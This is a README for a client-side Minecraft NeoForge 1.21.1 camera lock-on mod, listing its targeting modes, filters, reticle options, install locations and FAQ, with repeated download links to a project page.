# Action Camera Lock-On v1.0 - Game Script Utility 2026

> A client-side Minecraft NeoForge 1.21.1 mod that locks your camera onto a target, tracks it as it moves, and offers configurable combat assistance.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20NeoForge%201.21.1-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carlok1977/camera-target-lock-mod?style=flat-square)](https://github.com/carlok1977/camera-target-lock-mod)

---

<p align="center">
  <a href="https://carlok1977.github.io/camera-target-lock-mod/">
    <img src="https://img.shields.io/badge/Download-Action%20Camera%20Lock-On%20Script-brightgreen?style=for-the-badge" alt="Download Action Camera Lock-On Script">
  </a>
</p>

> **[Direct Download - Action Camera Lock-On](https://carlok1977.github.io/camera-target-lock-mod/)**

---

[Download Latest Build](https://carlok1977.github.io/camera-target-lock-mod/)

---

## Overview

Action Camera Lock-On keeps your viewpoint anchored to a target you pick, running entirely on the client for Minecraft with NeoForge 1.21.1. Camera tracking, target selection, and hands-on control through keybinds and configuration sit at the core of the mod.

Rather than automating gameplay, it aims to support combat by giving you steadier aim. Several targeting modes are available, along with a visual reticle and filters that change how lock-on responds in different scenarios, such as restricting targets to hostile mobs or requiring that a target is actually visible.

## Script Features

- Target tracking with smoothing for less jittery camera motion
- Smart lock mode that adapts target handling to the situation
- Always lock mode that holds focus on one target continuously
- Target switching to move your focus while playing
- Proximity prioritization that prefers targets close to you
- Hostile mobs only filter to narrow what gets selected
- Line-of-sight checks so only visible targets are locked
- 3D reticle rendering with configurable colors
- In-game configuration screen for fast tweaks
- Keybinding controls for toggling and switching by hand

## Setup

1. Grab the newest build from the project page.
2. Drop the mod file into your Minecraft mods folder.
3. Start Minecraft with NeoForge 1.21.1 installed.
4. Once in game, open the configuration screen to tune behavior.

Common install locations:
- Windows: `%appdata%/.minecraft/mods`
- macOS: `~/Library/Application Support/minecraft/mods`
- Linux: `~/.minecraft/mods`

When using a custom instance manager, place the mod in that instance's mods directory instead.

## Options

Control names may differ between builds, but lock-on behavior is what the mod lets you configure.

| Setting | Purpose |
| --- | --- |
| Smart Lock | Adapts target handling to current conditions |
| Always Lock | Keeps focus on the chosen target |
| Hostile Only | Restricts target selection to hostile mobs |
| Line of Sight | Requires visibility before a lock is made |
| Target Switching | Moves the active target when needed |
| Reticle Color | Changes how the 3D reticle looks |
| Keybindings | Assigns shortcuts for locking and switching |

Example configuration flow:
- Open the mod's config screen in-game
- Pick the lock mode you prefer
- Set target filters and the reticle color
- Bind keys for quick switching or toggling

## Compatibility

This mod targets Minecraft NeoForge 1.21.1 and runs on the client side. Because it builds on Minecraft's targeting and camera systems, compatibility tracks the game version and your mod loader setup.

Things to keep in mind:
- Built for NeoForge, not other loaders
- Target behavior depends on nearby entities and visibility
- Some settings may feel different depending on camera movement and input bindings
- Exact feature names may vary with future updates

## FAQ

### How do I install it?
Download the build, put it in your instance's mods folder, and launch Minecraft with NeoForge 1.21.1.

### Where do I change the settings?
The in-game configuration screen covers lock mode, filters, reticle appearance, and related options.

### Can I customize the targeting behavior?
Yes. Options include smart lock, always lock, target switching, proximity priority, hostile-only filtering, and line-of-sight checks.

### Does it work on other Minecraft versions?
This release is built for NeoForge 1.21.1. No other versions are listed as supported here.

### Can I change the reticle look?
Yes. A 3D reticle with custom reticle colors is part of the feature set.

### Where should I keep the file?
In the mods folder of whichever Minecraft instance you want to use it with, which matters most when you juggle multiple profiles or launchers.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
